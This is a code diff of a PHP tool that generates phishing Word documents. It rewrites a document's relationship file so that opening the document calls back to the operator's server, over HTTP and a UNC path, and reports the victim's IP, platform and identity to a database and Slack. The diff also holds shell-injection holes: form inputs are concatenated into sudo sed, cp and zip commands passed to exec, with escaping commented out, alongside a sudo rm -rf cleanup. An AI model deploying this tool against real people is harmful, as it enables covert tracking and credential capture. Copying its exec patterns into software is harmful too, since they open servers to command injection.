@@ -1,30 +1,5 @@
 <?php
 
-// Set Slack Webhook URL
-$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_TOKEN_HERE";
-$slackchannel = "#YOUR_SLACK_CHANNEL_HERE";
-$slackemoji = ":page_facing_up:";
-$slackbotname = "Phished_Document";
-$APIResultsURL = "https://YOUR_PHISHING_API_HERE/phishingdocs/results";
-
-$browser = get_browser($_SERVER[‘HTTP_USER_AGENT’], true);
-//print_r($browser);
-
-// Receives Required Parameters and Sets Variables
-$ip = $_SERVER['REMOTE_ADDR'];
-if(isset($_SERVER['HTTP_USER_AGENT'])){$useragent = $_SERVER['HTTP_USER_AGENT'];}else{$useragent = "";}
-if(isset($_REQUEST['target'])){$target = $_REQUEST['target'];}
-if(isset($_REQUEST['org'])){$org = $_REQUEST['org'];}
-if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}
-if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}
-
-$slackbotname = $slackbotname." (".$ip.")";
-
-// Makes Password Safe for DB
-if(isset($target)){$target = stripslashes($target);}
-if(isset($org)){$org = stripslashes($org);}
-$ip = stripslashes($ip);
-
 // Pulls in Required Connection Variables for DB
 require_once '../dbconfig.php';
 
@@ -37,21 +12,117 @@ if ($conn->connect_error) {
     die("Connection failed: " . $conn->connect_error);
 }
 
-if(isset($target)){
+// Set Slack Webhook URL
+if(isset($_REQUEST['slackurl'])){$slackurl = $_REQUEST['slackurl'];
+}
+else
+// ------------------------ SET THIS WEBHOOK MANUALLY --------------------------------------------------------------------------
+{$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_TOKEN_HERE";}
+if(isset($_REQUEST['slackchannel'])){$slackchannel = $_REQUEST['slackchannel']; $slackchannel = stripslashes($slackchannel);
+}
+else
+{$slackchannel = "#SET_YOUR_DEFAULT_SLACK_CHANNEL_HERE";}
+$slackemoji = ":page_facing_up:";
+$slackbotname = "Phished_Document";
+// ------------------------ SET THIS MANUALLY ----------------------------------------------------------------------------------
+$APIResultsURL = "https://YOUR_API_DOMAIN_HERE/phishingdocs/results";
+$uniqueid = uniqid();
+
+// Cleans up Input
+$slackurl = str_replace('"', "", $slackurl);
+$slackurl = str_replace("'", "", $slackurl);
+$slackurl = filter_var($slackurl, FILTER_SANITIZE_URL);
+$slackchannel = str_replace('"', "", $slackchannel);
+$slackchannel = str_replace("'", "", $slackchannel);
+
+// In Case Slack Tokens are Provided as Input, Create an Indirect Object Reference in the DB so it Isn't Available to the Target
+$targetset = isset($_REQUEST['Target']);
+if($targetset == 'false'){
+$slackurl = mysqli_real_escape_string($conn, $slackurl);
+$slackchannel = mysqli_real_escape_string($conn, $slackchannel);
+$uniqueid = mysqli_real_escape_string($conn, $uniqueid);
+
+$sqlselect0 = "CALL CreateNotificationRef('Slack','$slackurl','$slackchannel','$uniqueid');";
+$resultselect0 = $conn->query($sqlselect0);
+}
+
+printf($conn->error);
+$conn->close();
+
+$conn0 = mysqli_connect($servername, $username, $password, $dbname);
+
+// If the API is Receiving a Request, Get Slack Token for Alerting
+if(isset($_REQUEST['id'])){
+$id = mysqli_real_escape_string($conn0, stripslashes($_REQUEST['id']));
+
+$id = str_replace('"', "", $id);
+$id = str_replace("'", "", $id);
+$id = filter_var($id, FILTER_SANITIZE_SPECIAL_CHARS);
+
+$sqlgetslack = "CALL GetNotificationRef('$id');";
+$resultgetslack = $conn0->query($sqlgetslack);
+
+while($row = $resultgetslack->fetch_assoc()) {
+if($row["API_Token"] != ""){$slackurl = $row["API_Token"];}
+if($row["Channel"] != ""){$slackchannel = $row["Channel"];}
+}
+}
+
+printf($conn0->error);
+$conn0->close();
+
+$conn2 = mysqli_connect($servername, $username, $password, $dbname);
+
+// Grab the User Agent String (NOTE: browscap.ini must be downloaded and configured in php.ini)
+$browser = get_browser($_SERVER['HTTP_USER_AGENT'], true);
+//print_r($browser);
+
+// Receives Required Parameters and Sets Variables
+$ip = $_SERVER['REMOTE_ADDR'];
+if(isset($_SERVER['HTTP_USER_AGENT'])){$useragent = mysqli_real_escape_string($conn2, $_SERVER['HTTP_USER_AGENT']);}else{$useragent = "";}
+if(isset($_REQUEST['target'])){$target = mysqli_real_escape_string($conn2, $_REQUEST['target']);}
+if(isset($_REQUEST['org'])){$org = mysqli_real_escape_string($conn2, $_REQUEST['org']);}
+
+$slackbotname = $slackbotname." (".$ip.")";
+
+// Makes Password Safe for DB
+if(isset($target)){$target = stripslashes($target); $target = filter_var($target, FILTER_SANITIZE_SPECIAL_CHARS);}
+if(isset($org)){$org = stripslashes($org); $org = filter_var($org, FILTER_SANITIZE_SPECIAL_CHARS);}
+$ip = stripslashes($ip);
+$ip = filter_var($ip, FILTER_SANITIZE_SPECIAL_CHARS);
+
+if(isset($_REQUEST["target"], $_REQUEST["id"])){
+
 
 // Looks Up Recent Requests to Prevent Flooding
-$sqlselect = "SELECT * FROM requests WHERE IP = '$ip' AND Target = '$target' AND Org = '$org' AND Datetime >= NOW() - INTERVAL 15 SECOND;";
-$resultselect = $conn->query($sqlselect);
+$sqlselect = "CALL CheckRecentlySubmitted('$ip','$target','$org');";
+$resultselect = $conn2->query($sqlselect);
 
-// If There Isn't a Recent (Within 1 Second) Similar Request..
-if(mysqli_num_rows($resultselect) == 0){
+$i = 0;
+
+while($row2 = $resultselect->fetch_assoc()) {
+$i = $i + 1;
+}
+
+printf($conn2->error);
+$conn2->close();
+
+$conn3 = mysqli_connect($servername, $username, $password, $dbname);
+
+// If There Isn't a Recent (Within 10 Seconds) Similar Request..
+if($i == 0){
+
+$useragent = mysqli_real_escape_string($conn3, $useragent);
+$useragent = stripslashes($useragent);
 
 // Inserts Captured Information Into MySQL DB
-$sql = "INSERT INTO requests (Datetime, IP, Target, Org, UA) VALUES (now(), '$ip','$target','$org','$useragent');";
-$result = $conn->query($sql);
+$sqlinsert = "CALL InsertRequests('$ip','$target','$org','$useragent');";
+$resultinsert = $conn3->query($sqlinsert);
 
+printf($conn3->error);
+$conn3->close();
 
-
+// Prepares Message for Slack
 if($target != "" && $org != ""){
 
 $orglink = "<".$APIResultsURL."|".$org.">";
@@ -70,7 +141,7 @@ $message = "Document opened at ".$orglink." on ".$browser['platform']."!";
 
 if($target != "" && $org == ""){
 
-$targetlink = "<".$APIResultsURL."|".$targetlink.">";
+$targetlink = "<".$APIResultsURL."|".$target.">";
 
 $message = "Document opened by ".$targetlink." on ".$browser['platform']."!";
 
@@ -83,7 +154,7 @@ if($target == "" && $org == ""){
 // Send to Slack
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';
 
-
+//$cmd = escapeshellcmd($cmd);
 exec($cmd);
 
 }
@@ -332,12 +403,24 @@ td.input input {
 <?php
 if(isset($_REQUEST['URL'])){
 
-// Create Payload
-$URL = $_REQUEST['URL'];
-$HTTPValue = $_REQUEST['HTTPValue'];
-$Target = $_REQUEST['Target'];
-$Org = $_REQUEST['Org'];
+// Receives and Cleans Input From Create Payload Form
+$URL = stripslashes($_REQUEST['URL']);
+$HTTPValue = stripslashes($_REQUEST['HTTPValue']);
+$Target = stripslashes($_REQUEST['Target']);
+$Org = stripslashes($_REQUEST['Org']);
 
+
+$URL = str_replace('"', "", $URL);
+$URL = str_replace("'", "", $URL);
+$HTTPValue = str_replace('"', "", $HTTPValue);
+$HTTPValue = str_replace("'", "", $HTTPValue);
+$Target = str_replace('"', "", $Target);
+$Target = str_replace("'", "", $Target);
+$Org = str_replace('"', "", $Org);
+$Org = str_replace("'", "", $Org);
+
+
+// Generates Payload
 $cmdcleanup = "sudo rm -rf /var/www/uploads/*;";
 exec($cmdcleanup);
 
@@ -375,49 +458,58 @@ if ($uploadOk == 0) {
 
 if($uploadOk == 1){
 
-$cmd0 = "sudo cp '/var/www/uploads/".basename( $_FILES["fileToUpload"]["name"])."' /var/www/uploads/Phishing.docx;";
+// If the a Document Template was Uploaded, Insert Payload
+$cmd0 = "sudo cp '/var/www/uploads/".(basename( $_FILES["fileToUpload"]["name"]))."' /var/www/uploads/Phishing.docx;";
+//$cmd0 = escapeshellcmd($cmd0);
 exec($cmd0,$output0);
 
 //var_dump($output0);
 //echo $cmd0;
 
-$cmd1 = "sudo python InjectPayload.py \"".basename( $_FILES["fileToUpload"]["name"])."\";";
+$cmd1 = "sudo python InjectPayload.py \"".(basename( $_FILES["fileToUpload"]["name"]))."\";";
+//$cmd1 = escapeshellcmd($cmd1);
 exec ($cmd1,$output1);
 
 //var_dump($output1);
 //echo $cmd1;
 
 $cmd2 = "cd /var/www/uploads/ && sudo unzip -o Phishing.docx;";
+//$cmd2 = escapeshellcmd($cmd2);
 exec ($cmd2,$output2);
 
 //var_dump($output2);
 //echo $cmd2;
 
 $cmd3 = "ls /var/www/uploads/word/media -1 | sort -V | tail -2 |grep 'png'";
+//$cmd3 = escapeshellcmd($cmd3);
 exec ($cmd3,$outputcmd2);
 
 //echo $cmd3;
 //var_dump($outputcmd2);
 
-$cmd4 = 'sudo sed -i -e \'s~media/'.$outputcmd2[0].'\\"~'.$HTTPValue.'://'.$URL.'/phishingdocs?target='.$Target.'\&amp;org='.$Org.'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+$cmd4 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[0]).'\\"~'.stripslashes($HTTPValue).'://'.stripslashes($URL).'/phishingdocs?target='.stripslashes($Target).'\&amp;org='.stripslashes($Org).'\&amp;id='.stripslashes($uniqueid).'\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+//$cmd4 = escapeshellcmd($cmd4);
 exec($cmd4,$output4);
 
 //var_dump($output4);
 //echo $cmd4;
 
-$cmd5 = 'sudo sed -i -e \'s~media/'.$outputcmd2[1].'\\"~\\\\\\\\\\'.$URL.'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+$cmd5 = 'sudo sed -i -e \'s~media/'.stripslashes($outputcmd2[1]).'\\"~\\\\\\\\\\'.stripslashes($URL).'/phishingdocs.jpg\\" TargetMode=\\"External\\"~g\' /var/www/uploads/word/_rels/document.xml.rels;';
+//$cmd5 = escapeshellcmd($cmd5);
 exec($cmd5,$output5);
 
 //var_dump($output5);
 //echo $cmd5;
 
 $cmd6 = "cd /var/www/uploads/ && sudo zip -r Phishing.docx word/_rels/document.xml.rels;";
+//$cmd6 = escapeshellcmd($cmd6);
 exec($cmd6, $output6);
 
 //var_dump($output6);
 //echo $cmd6;
 
 $cmd7 = "cp /var/www/uploads/Phishing.docx /var/www/html/phishingdocs/PhishingTEMPLATE.docx;";
+//$cmd7 = escapeshellcmd($cmd7);
 exec($cmd7, $output7);
 
 //var_dump($output7);
@@ -425,22 +517,33 @@ exec($cmd7, $output7);
 
 } else {
 
+// If a Template was NOT Uploaded, Create a Default Template for Them
 $cmd8 = "cp document.xml.rels.TEMPLATE word/_rels/document.xml.rels;";
+//$cmd8 = escapeshellcmd($cmd8);
 exec($cmd8);
 
-$cmd9 = "sed -i -e 's~HTTPVALUE~".$HTTPValue."~g' word/_rels/document.xml.rels;";
+$cmd9 = "sudo sed -i -e 's~HTTPVALUE~".stripslashes($HTTPValue)."~g' word/_rels/document.xml.rels;";
+//$cmd9 = escapeshellcmd($cmd9);
 exec($cmd9);
 
-$cmd10 = "sed -i -e 's~URLVALUE~".$URL."~g' word/_rels/document.xml.rels;";
+$cmd10 = "sudo sed -i -e 's~URLVALUE~".stripslashes($URL)."~g' word/_rels/document.xml.rels;";
+//$cmd10 = escapeshellcmd($cmd10);
 exec($cmd10);
 
-$cmd11 = "sed -i -e 's~TARGETVALUE~".$Target."~g' word/_rels/document.xml.rels;";
+$cmd11 = "sudo sed -i -e 's~TARGETVALUE~".stripslashes($Target)."~g' word/_rels/document.xml.rels;";
+//$cmd11 = escapeshellcmd($cmd11);
 exec($cmd11);
 
-$cmd12 = "sed -i -e 's~ORGVALUE~".$Org."~g' word/_rels/document.xml.rels;";
+$cmd12 = "sudo sed -i -e 's~ORGVALUE~".stripslashes($Org)."~g' word/_rels/document.xml.rels;";
+//$cmd12 = escapeshellcmd($cmd12);
 exec($cmd12);
 
-$cmd13 = "sudo zip -r Phishing.docx word/_rels/document.xml.rels";
+$cmdID = "sudo sed -i -e 's~IDVALUE~".$uniqueid."~g' word/_rels/document.xml.rels;";
+//$cmdID = escapeshellcmd($cmdID);
+exec($cmdID);
+
+$cmd13 = "sudo sudo zip -r Phishing.docx word/_rels/document.xml.rels";
+//$cmd13 = escapeshellcmd($cmd13);
 exec($cmd13);
 
 }
@@ -450,6 +553,7 @@ exec($cmd13);
 <br><br>
 <?php
 if($uploadOk == 1){
+// Either Provide the Weaponized Template they Uploaded or a New One
 ?>
 <form action="PhishingTEMPLATE.docx" method="get">
 <?php } else { ?>
@@ -462,19 +566,20 @@ if($uploadOk == 1){
 
 }
 else {
+// If the API Isn't Receiving Requests from a Doc Already, Display Form to Create One
 ?>
 <FORM METHOD="POST"  ACTION="<?php $_SERVER["PHP_SELF"]; ?>" enctype="multipart/form-data">
 <CENTER>
 <FONT COLOR="#ffffff"><H1>Create a Phishing Word Doc</H1></FONT><br>
 <TABLE>
 <TR>
-<TH COLSPAN="2">API URL</TH><TH>Target</TH><TH>Orginization</TH>
+<TH COLSPAN="2">API URL</TH><TH>Target</TH><TH>Orginization</TH><TH COLSPAN="2">Slack Settings</TH>
 </TR>
 <TR>
-<TD><SELECT NAME="HTTPValue"><option value="http">http</option><option value="https">https</option></SELECT></TD><TD><input type="text" name="URL" value="<?php echo $_SERVER['SERVER_NAME'];?>"></TD><TD><input type="text" name="Target" value="Joe Smith"></TD><TD><input type="text" name="Org" value="Evil Corp"></TD>
+<TD><SELECT NAME="HTTPValue"><option value="http">http</option><option value="https">https</option></SELECT></TD><TD><input type="text" name="URL" value="<?php echo $_SERVER['SERVER_NAME'];?>"></TD><TD><input type="text" name="Target" value="Joe Smith"></TD><TD><input type="text" name="Org" value="Evil Corp"></TD><TD align="center"><input type="text" name="slackurl" value="" placeholder="Slack Webhook URL Here"><br><FONT SIZE="2">Not Required - Defaults to Conf</font></TD><TD align="center"><input type="text" value="" placeholder="#slack_channel" name="slackchannel"><br><font size="2">Not Required - Defaults to Conf</font></TD>
 </TR>
 <TR>
-<TD COLSPAN="4">
+<TD COLSPAN="6">
 <i>(<b>Optional</b> - Weaponize Your Own Document!)<i><br><br>
 <input type="file" name="fileToUpload" id="fileToUpload">
 </TD>
@@ -497,9 +602,5 @@ else {
 <?php
 }
 
-
-
-printf($conn->error);
-$conn->close();
 
 ?>
